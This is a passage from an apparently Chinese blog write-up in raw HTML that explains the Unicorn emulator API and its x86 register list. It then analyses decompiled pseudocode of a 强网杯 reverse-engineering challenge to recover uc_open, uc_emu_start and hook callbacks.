class="hljs-title">uc_reg_write</span><span class="hljs-params">(uc_engine *uc, <span class="hljs-keyword">int</span> regid, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *value)</span></span>;<br>将值写入寄存器<br><span class="hljs-meta">@uc</span>: uc_open()返回的句柄<br><span class="hljs-meta">@regid</span>:  将被修改的寄存器ID<br><span class="hljs-meta">@value</span>:  指向寄存器将被修改成的值的指针<br><br><span class="hljs-meta">@return</span> 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型<br><br><span class="hljs-comment">//&gt; X86 registers</span><br>typedef <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">uc_x86_reg</span> </span>&#123;<br>    <span class="hljs-number">0</span>   UC_X86_REG_INVALID = <span class="hljs-number">0</span>,<br><span class="hljs-number">1</span>       UC_X86_REG_AH,<br><span class="hljs-number">2</span>       UC_X86_REG_AL,<br><span class="hljs-number">3</span>       UC_X86_REG_AX,<br><span class="hljs-number">4</span>       UC_X86_REG_BH,<br><span class="hljs-number">5</span>       UC_X86_REG_BL,<br><span class="hljs-number">6</span>       UC_X86_REG_BP,<br><span class="hljs-number">7</span>       UC_X86_REG_BPL,<br><span class="hljs-number">8</span>       UC_X86_REG_BX,<br><span class="hljs-number">9</span>       UC_X86_REG_CH,<br><span class="hljs-number">10</span>      UC_X86_REG_CL,<br><span class="hljs-number">11</span>      UC_X86_REG_CS,<br><span class="hljs-number">12</span>      UC_X86_REG_CX,<br><span class="hljs-number">13</span>      UC_X86_REG_DH,<br><span class="hljs-number">14</span>      UC_X86_REG_DI,<br><span class="hljs-number">15</span>      UC_X86_REG_DIL,<br><span class="hljs-number">16</span>      UC_X86_REG_DL,<br><span class="hljs-number">17</span>      UC_X86_REG_DS,<br><span class="hljs-number">18</span>      UC_X86_REG_DX,<br><span class="hljs-number">19</span>      UC_X86_REG_EAX,<br><span class="hljs-number">20</span>      UC_X86_REG_EBP,<br><span class="hljs-number">21</span>      UC_X86_REG_EBX,<br><span class="hljs-number">22</span>      UC_X86_REG_ECX,<br><span class="hljs-number">23</span>      UC_X86_REG_EDI,<br><span class="hljs-number">24</span>      UC_X86_REG_EDX,<br><span class="hljs-number">25</span>      UC_X86_REG_EFLAGS,<br><span class="hljs-number">26</span>      UC_X86_REG_EIP,<br><span class="hljs-number">27</span>      UC_X86_REG_EIZ,<br><span class="hljs-number">28</span>      UC_X86_REG_ES,<br><span class="hljs-number">29</span>      UC_X86_REG_ESI,<br><span class="hljs-number">30</span>      UC_X86_REG_ESP,<br><span class="hljs-number">31</span>      UC_X86_REG_FPSW,<br><span class="hljs-number">32</span>      UC_X86_REG_FS,<br><span class="hljs-number">33</span>      UC_X86_REG_GS,<br><span class="hljs-number">34</span>      UC_X86_REG_IP,<br><span class="hljs-number">35</span>      UC_X86_REG_RAX,<br><span class="hljs-number">36</span>      UC_X86_REG_RBP,<br><span class="hljs-number">37</span>      UC_X86_REG_RBX,<br><span class="hljs-number">38</span>      UC_X86_REG_RCX,<br><span class="hljs-number">39</span>      UC_X86_REG_RDI,<br><span class="hljs-number">40</span>      UC_X86_REG_RDX,<br><span class="hljs-number">41</span>      UC_X86_REG_RIP,<br><span class="hljs-number">42</span>      UC_X86_REG_RIZ,<br><span class="hljs-number">43</span>      UC_X86_REG_RSI,<br><span class="hljs-number">44</span>      UC_X86_REG_RSP,<br><span class="hljs-number">45</span>      UC_X86_REG_SI,<br><span class="hljs-number">46</span>      UC_X86_REG_SIL,<br><span class="hljs-number">47</span>      UC_X86_REG_SP,<br><span class="hljs-number">48</span>      UC_X86_REG_SPL,<br><span class="hljs-number">49</span>      UC_X86_REG_SS,<br><span class="hljs-number">50</span>      UC_X86_REG_CR0,<br><span class="hljs-number">51</span>      UC_X86_REG_CR1,<br><span class="hljs-number">52</span>      UC_X86_REG_CR2,<br><span class="hljs-number">53</span>      UC_X86_REG_CR3,<br><span class="hljs-number">54</span>      UC_X86_REG_CR4,<br><span class="hljs-number">55</span>      UC_X86_REG_CR5,<br><span class="hljs-number">56</span>      UC_X86_REG_CR6,<br><span class="hljs-number">57</span>      UC_X86_REG_CR7,<br><span class="hljs-number">58</span>      UC_X86_REG_CR8,<br><span class="hljs-number">59</span>      UC_X86_REG_CR9,<br><span class="hljs-number">60</span>      UC_X86_REG_CR10,<br><span class="hljs-number">61</span>      UC_X86_REG_CR11,<br><span class="hljs-number">62</span>      UC_X86_REG_CR12,<br><span class="hljs-number">63</span>      UC_X86_REG_CR13,<br><span class="hljs-number">64</span>      UC_X86_REG_CR14,<br><span class="hljs-number">65</span>      UC_X86_REG_CR15,<br><span class="hljs-number">66</span>      UC_X86_REG_DR0,<br><span class="hljs-number">67</span>      UC_X86_REG_DR1,<br><span class="hljs-number">68</span>      UC_X86_REG_DR2,<br><span class="hljs-number">69</span>      UC_X86_REG_DR3,<br><span class="hljs-number">70</span>      UC_X86_REG_DR4,<br><span class="hljs-number">71</span>      UC_X86_REG_DR5,<br><span class="hljs-number">72</span>      UC_X86_REG_DR6,<br><span class="hljs-number">73</span>      UC_X86_REG_DR7,<br><span class="hljs-number">74</span>      UC_X86_REG_DR8,<br><span class="hljs-number">75</span>      UC_X86_REG_DR9,<br><span class="hljs-number">76</span>      UC_X86_REG_DR10,<br><span class="hljs-number">77</span>      UC_X86_REG_DR11,<br><span class="hljs-number">78</span>      UC_X86_REG_DR12,<br><span class="hljs-number">79</span>      UC_X86_REG_DR13,<br><span class="hljs-number">80</span>      UC_X86_REG_DR14,<br><span class="hljs-number">81</span>      UC_X86_REG_DR15,<br><span class="hljs-number">82</span>      UC_X86_REG_FP0,<br><span class="hljs-number">83</span>      UC_X86_REG_FP1,<br><span class="hljs-number">84</span>      UC_X86_REG_FP2,<br><span class="hljs-number">85</span>      UC_X86_REG_FP3,<br><span class="hljs-number">86</span>      UC_X86_REG_FP4,<br><span class="hljs-number">87</span>      UC_X86_REG_FP5,<br><span class="hljs-number">88</span>      UC_X86_REG_FP6,<br><span class="hljs-number">89</span>      UC_X86_REG_FP7,<br><span class="hljs-number">90</span>      UC_X86_REG_K0,<br><span class="hljs-number">91</span>      UC_X86_REG_K1,<br><span class="hljs-number">92</span>      UC_X86_REG_K2,<br><span class="hljs-number">93</span>      UC_X86_REG_K3,<br><span class="hljs-number">94</span>      UC_X86_REG_K4,<br><span class="hljs-number">95</span>      UC_X86_REG_K5,<br><span class="hljs-number">96</span>      UC_X86_REG_K6,<br><span class="hljs-number">97</span>      UC_X86_REG_K7,<br><span class="hljs-number">98</span>      UC_X86_REG_MM0,<br><span class="hljs-number">99</span>      UC_X86_REG_MM1,<br><span class="hljs-number">100</span>     UC_X86_REG_MM2,<br><span class="hljs-number">101</span>     UC_X86_REG_MM3,<br><span class="hljs-number">102</span>     UC_X86_REG_MM4,<br><span class="hljs-number">103</span>     UC_X86_REG_MM5,<br><span class="hljs-number">104</span>     UC_X86_REG_MM6,<br><span class="hljs-number">105</span>     UC_X86_REG_MM7,<br><span class="hljs-number">106</span>     UC_X86_REG_R8,<br><span class="hljs-number">107</span>     UC_X86_REG_R9,<br><span class="hljs-number">108</span>     UC_X86_REG_R10,<br><span class="hljs-number">109</span>     UC_X86_REG_R11,<br><span class="hljs-number">110</span>     UC_X86_REG_R12,<br><span class="hljs-number">111</span>     UC_X86_REG_R13,<br><span class="hljs-number">112</span>     UC_X86_REG_R14,<br><span class="hljs-number">113</span>     UC_X86_REG_R15,<br><span class="hljs-number">114</span>     UC_X86_REG_ST0,<br><span class="hljs-number">115</span>     UC_X86_REG_ST1,<br><span class="hljs-number">116</span>     UC_X86_REG_ST2,<br><span class="hljs-number">117</span>     UC_X86_REG_ST3,<br><span class="hljs-number">118</span>     UC_X86_REG_ST4,<br><span class="hljs-number">119</span>     UC_X86_REG_ST5,<br><span class="hljs-number">120</span>     UC_X86_REG_ST6,<br><span class="hljs-number">121</span>     UC_X86_REG_ST7,<br><span class="hljs-number">122</span>     UC_X86_REG_XMM0,<br><span class="hljs-number">123</span>     UC_X86_REG_XMM1,<br><span class="hljs-number">124</span>     UC_X86_REG_XMM2,<br><span class="hljs-number">125</span>     UC_X86_REG_XMM3,<br><span class="hljs-number">126</span>     UC_X86_REG_XMM4,<br><span class="hljs-number">127</span>     UC_X86_REG_XMM5,<br><span class="hljs-number">128</span>     UC_X86_REG_XMM6,<br><span class="hljs-number">129</span>     UC_X86_REG_XMM7,<br><span class="hljs-number">130</span>     UC_X86_REG_XMM8,<br><span class="hljs-number">131</span>     UC_X86_REG_XMM9,<br><span class="hljs-number">132</span>     UC_X86_REG_XMM10,<br><span class="hljs-number">133</span>     UC_X86_REG_XMM11,<br><span class="hljs-number">134</span>     UC_X86_REG_XMM12,<br><span class="hljs-number">135</span>     UC_X86_REG_XMM13,<br><span class="hljs-number">136</span>     UC_X86_REG_XMM14,<br><span class="hljs-number">137</span>     UC_X86_REG_XMM15,<br><span class="hljs-number">138</span>     UC_X86_REG_XMM16,<br><span class="hljs-number">139</span>     UC_X86_REG_XMM17,<br><span class="hljs-number">140</span>     UC_X86_REG_XMM18,<br><span class="hljs-number">141</span>     UC_X86_REG_XMM19,<br><span class="hljs-number">142</span>     UC_X86_REG_XMM20,<br><span class="hljs-number">143</span>     UC_X86_REG_XMM21,<br><span class="hljs-number">144</span>     UC_X86_REG_XMM22,<br><span class="hljs-number">145</span>     UC_X86_REG_XMM23,<br><span class="hljs-number">146</span>     UC_X86_REG_XMM24,<br><span class="hljs-number">147</span>     UC_X86_REG_XMM25,<br><span class="hljs-number">148</span>     UC_X86_REG_XMM26,<br><span class="hljs-number">149</span>     UC_X86_REG_XMM27,<br><span class="hljs-number">150</span>     UC_X86_REG_XMM28,<br><span class="hljs-number">151</span>     UC_X86_REG_XMM29,<br><span class="hljs-number">152</span>     UC_X86_REG_XMM30,<br><span class="hljs-number">153</span>     UC_X86_REG_XMM31,<br><span class="hljs-number">154</span>     UC_X86_REG_YMM0,<br><span class="hljs-number">155</span>     UC_X86_REG_YMM1,<br><span class="hljs-number">156</span>     UC_X86_REG_YMM2,<br><span class="hljs-number">157</span>     UC_X86_REG_YMM3,<br><span class="hljs-number">158</span>     UC_X86_REG_YMM4,<br><span class="hljs-number">159</span>     UC_X86_REG_YMM5,<br><span class="hljs-number">160</span>     UC_X86_REG_YMM6,<br><span class="hljs-number">161</span>     UC_X86_REG_YMM7,<br><span class="hljs-number">162</span>     UC_X86_REG_YMM8,<br><span class="hljs-number">163</span>     UC_X86_REG_YMM9,<br><span class="hljs-number">164</span>     UC_X86_REG_YMM10,<br><span class="hljs-number">165</span>     UC_X86_REG_YMM11,<br><span class="hljs-number">166</span>     UC_X86_REG_YMM12,<br><span class="hljs-number">167</span>     UC_X86_REG_YMM13,<br><span class="hljs-number">168</span>     UC_X86_REG_YMM14,<br><span class="hljs-number">169</span>     UC_X86_REG_YMM15,<br><span class="hljs-number">170</span>     UC_X86_REG_YMM16,<br><span class="hljs-number">171</span>     UC_X86_REG_YMM17,<br><span class="hljs-number">172</span>     UC_X86_REG_YMM18,<br><span class="hljs-number">173</span>     UC_X86_REG_YMM19,<br><span class="hljs-number">174</span>     UC_X86_REG_YMM20,<br><span class="hljs-number">175</span>     UC_X86_REG_YMM21,<br><span class="hljs-number">176</span>     UC_X86_REG_YMM22,<br><span class="hljs-number">177</span>     UC_X86_REG_YMM23,<br><span class="hljs-number">178</span>     UC_X86_REG_YMM24,<br><span class="hljs-number">179</span>     UC_X86_REG_YMM25,<br><span class="hljs-number">180</span>     UC_X86_REG_YMM26,<br><span class="hljs-number">181</span>     UC_X86_REG_YMM27,<br><span class="hljs-number">182</span>     UC_X86_REG_YMM28,<br><span class="hljs-number">183</span>     UC_X86_REG_YMM29,<br><span class="hljs-number">184</span>     UC_X86_REG_YMM30,<br><span class="hljs-number">185</span>     UC_X86_REG_YMM31,<br><span class="hljs-number">186</span>     UC_X86_REG_ZMM0,<br><span class="hljs-number">187</span>     UC_X86_REG_ZMM1,<br><span class="hljs-number">188</span>     UC_X86_REG_ZMM2,<br><span class="hljs-number">189</span>     UC_X86_REG_ZMM3,<br><span class="hljs-number">190</span>     UC_X86_REG_ZMM4,<br><span class="hljs-number">191</span>     UC_X86_REG_ZMM5,<br><span class="hljs-number">192</span>     UC_X86_REG_ZMM6,<br><span class="hljs-number">193</span>     UC_X86_REG_ZMM7,<br><span class="hljs-number">194</span>     UC_X86_REG_ZMM8,<br><span class="hljs-number">195</span>     UC_X86_REG_ZMM9,<br><span class="hljs-number">196</span>     UC_X86_REG_ZMM10,<br><span class="hljs-number">197</span>     UC_X86_REG_ZMM11,<br><span class="hljs-number">198</span>     UC_X86_REG_ZMM12,<br><span class="hljs-number">199</span>     UC_X86_REG_ZMM13,<br><span class="hljs-number">200</span>     UC_X86_REG_ZMM14,<br><span class="hljs-number">201</span>     UC_X86_REG_ZMM15,<br><span class="hljs-number">202</span>     UC_X86_REG_ZMM16,<br><span class="hljs-number">203</span>     UC_X86_REG_ZMM17,<br><span class="hljs-number">204</span>     UC_X86_REG_ZMM18,<br><span class="hljs-number">205</span>     UC_X86_REG_ZMM19,<br><span class="hljs-number">206</span>     UC_X86_REG_ZMM20,<br><span class="hljs-number">207</span>     UC_X86_REG_ZMM21,<br><span class="hljs-number">208</span>     UC_X86_REG_ZMM22,<br><span class="hljs-number">209</span>     UC_X86_REG_ZMM23,<br><span class="hljs-number">210</span>     UC_X86_REG_ZMM24,<br><span class="hljs-number">211</span>     UC_X86_REG_ZMM25,<br><span class="hljs-number">212</span>     UC_X86_REG_ZMM26,<br><span class="hljs-number">213</span>     UC_X86_REG_ZMM27,<br><span class="hljs-number">214</span>     UC_X86_REG_ZMM28,<br><span class="hljs-number">215</span>     UC_X86_REG_ZMM29,<br><span class="hljs-number">216</span>     UC_X86_REG_ZMM30,<br><span class="hljs-number">217</span>     UC_X86_REG_ZMM31,<br><span class="hljs-number">218</span>     UC_X86_REG_R8B,<br><span class="hljs-number">219</span>     UC_X86_REG_R9B,<br><span class="hljs-number">220</span>     UC_X86_REG_R10B,<br><span class="hljs-number">221</span>     UC_X86_REG_R11B,<br><span class="hljs-number">222</span>     UC_X86_REG_R12B,<br><span class="hljs-number">223</span>     UC_X86_REG_R13B,<br><span class="hljs-number">224</span>     UC_X86_REG_R14B,<br><span class="hljs-number">225</span>     UC_X86_REG_R15B,<br><span class="hljs-number">226</span>     UC_X86_REG_R8D,<br><span class="hljs-number">227</span>     UC_X86_REG_R9D,<br><span class="hljs-number">228</span>     UC_X86_REG_R10D,<br><span class="hljs-number">229</span>     UC_X86_REG_R11D,<br><span class="hljs-number">230</span>     UC_X86_REG_R12D,<br><span class="hljs-number">231</span>     UC_X86_REG_R13D,<br><span class="hljs-number">232</span>     UC_X86_REG_R14D,<br><span class="hljs-number">233</span>     UC_X86_REG_R15D,<br><span class="hljs-number">234</span>     UC_X86_REG_R8W,<br><span class="hljs-number">235</span>     UC_X86_REG_R9W,<br><span class="hljs-number">236</span>     UC_X86_REG_R10W,<br><span class="hljs-number">237</span>     UC_X86_REG_R11W,<br><span class="hljs-number">238</span>     UC_X86_REG_R12W,<br><span class="hljs-number">239</span>     UC_X86_REG_R13W,<br><span class="hljs-number">240</span>     UC_X86_REG_R14W,<br><span class="hljs-number">241</span>     UC_X86_REG_R15W,<br><span class="hljs-number">242</span>     UC_X86_REG_IDTR,<br><span class="hljs-number">243</span>     UC_X86_REG_GDTR,<br><span class="hljs-number">244</span>     UC_X86_REG_LDTR,<br><span class="hljs-number">245</span>     UC_X86_REG_TR,<br><span class="hljs-number">246</span>     UC_X86_REG_FPCW,<br><span class="hljs-number">247</span>     UC_X86_REG_FPTAG,<br><span class="hljs-number">248</span>     UC_X86_REG_MSR,<br><span class="hljs-number">249</span>     <span class="hljs-comment">// Model-Specific Register</span><br><span class="hljs-number">250</span>     UC_X86_REG_MXCSR,<br><span class="hljs-number">251</span>     UC_X86_REG_FS_BASE,<br><span class="hljs-number">252</span>     <span class="hljs-comment">// Base regs for x86_64</span><br><span class="hljs-number">253</span>     UC_X86_REG_GS_BASE,<br><span class="hljs-number">254</span>     UC_X86_REG_ENDING        <span class="hljs-comment">// &lt;-- mark the end of the list of registers</span><br>&#125; uc_x86_reg;<br></code></pre></td></tr></table></figure><h2 id="程序逻辑分析"><a href="#程序逻辑分析" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h2><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729154714716.png" alt="image-20210729154714716"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sub_1095A(4LL, </span><span class="hljs-number">8</span>LL, &amp;v14)<span class="hljs-comment">; 此函数没有被还原，根据代码猜测这里应该是uc_open</span><br>根据uc_arch和uc_mode数据类型可以得知，<span class="hljs-number">4</span> 是 UC_ARCH_X86，<span class="hljs-number">8</span> 是 UC_MODE_64。<br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729154729851.png" alt="image-20210729154729851"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs arduino">同样的，我们判断出这个函数是<span class="hljs-built_in">uc_emu_start</span>()<br>我经过恢复符号表，并不是很完整，我们又不能看别人说这是什么函数，而自己不懂就照搬。<br>查看uc_emu_start的源代码实现：<br><span class="hljs-function">uc_err <span class="hljs-title">uc_emu_start</span><span class="hljs-params">(uc_engine* uc, <span class="hljs-keyword">uint64_t</span> begin, <span class="hljs-keyword">uint64_t</span> until, <span class="hljs-keyword">uint64_t</span> timeout, <span class="hljs-keyword">size_t</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 重制计数器</span><br>    uc-&gt;emu_counter = <span class="hljs-number">0</span>;<br>    uc-&gt;invalid_error = UC_ERR_OK;<br>    uc-&gt;block_full = <span class="hljs-literal">false</span>;<br>    uc-&gt;emulation_done = <span class="hljs-literal">false</span>;<br>    uc-&gt;timed_out = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span>(uc-&gt;arch) &#123;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> UNICORN_HAS_M68K</span><br>        <span class="hljs-keyword">case</span> UC_ARCH_M68K:<br>            <span class="hljs-built_in">uc_reg_write</span>(uc, UC_M68K_REG_PC, &amp;begin);<br>            <span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> UNICORN_HAS_X86</span><br>        <span class="hljs-keyword">case</span> UC_ARCH_X86:<br>            <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span>(uc-&gt;mode) &#123;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> UC_MODE_16: &#123;<br>                    <span class="hljs-keyword">uint64_t</span> ip;<br>                    <span class="hljs-keyword">uint16_t</span> cs;<br><br>                    <span class="hljs-built_in">uc_reg_read</span>(uc, UC_X86_REG_CS, &amp;cs);<br>                    <span class="hljs-comment">// 抵消后面增加的 IP 和 CS</span><br>                    ip = begin - cs*<span class="hljs-number">16</span>;<br>                    <span class="hljs-built_in">uc_reg_write</span>(uc, UC_X86_REG_IP, &amp;ip);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">case</span> UC_MODE_32:<br>                    <span class="hljs-built_in">uc_reg_write</span>(uc, UC_X86_REG_EIP, &amp;begin);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> UC_MODE_64:<br>                    <span class="hljs-built_in">uc_reg_write</span>(uc, UC_X86_REG_RIP, &amp;begin);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>......<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这段代码和IDA中的伪代码几乎一致：</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729155328456.png" alt="image-20210729155328456"></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">v11是<span class="hljs-keyword">uc</span>结构体，根据此情况，我们判断出，DF59这个函数是uc_reg_write，DF27这个函数是uc_reg_read。<br>大部分函数都恢复了符号。<br>程序逻辑主要是模拟执行了code里的字节码。如果这个题再没有其他操作，我们直接<span class="hljs-keyword">dump</span>字节码，分析代码即可，但以这道题的难度显然不可能。<br></code></pre></td></tr></table></figure><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729161053681.png" alt="image-20210729161053681"></p><p>这道题的关键点在于多个uc_hook_add回调函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c">input：<br><span class="hljs-function">__int64 __fastcall <span class="hljs-title">input</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v3; <span class="hljs-comment">// rbp</span><br>  _DWORD v5[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp-18h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp-10h] [rbp-18h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp-8h] [rbp-10h]</span><br><br>  v7 = v3;<br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v5[<span class="hljs-number">1</span>] = a2;<br>  v5[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  read(a2, v5, a3);   <span class="hljs-comment">//读取输入</span><br>  <span class="hljs-keyword">return</span> v5[<span class="hljs-number">0</span>];<br>&#125;<br><br>output：<br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> __fastcall <span class="hljs-title">output</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">int</span> a3, <span class="hljs-keyword">int</span> a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> buf[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+Ch] [rbp-24h] BYREF</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v6 = a1;<br>  buf[<span class="hljs-number">2</span>] = a2;<br>  buf[<span class="hljs-number">1</span>] = a3;<br>  buf[<span class="hljs-number">0</span>] = a4;<br>  fd = a2;<br>  <span class="hljs-keyword">return</span> write(a2, buf, a3);  <span class="hljs-comment">//输出</span><br>&#125;<br><br>syscall_time:<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">syscall_time</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-18h] BYREF</span><br>  <span class="hljs-keyword">time_t</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v2 = <span class="hljs-number">0LL</span>;<br>  uc_reg_read(a1, <span class="hljs-number">35</span>, (__int64)&amp;v2);            <span class="hljs-comment">// 读取RAX寄存器的值</span><br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">0x1337</span> )                           <span class="hljs-comment">// 判断</span><br>  &#123;<br>    v3 = time(<span 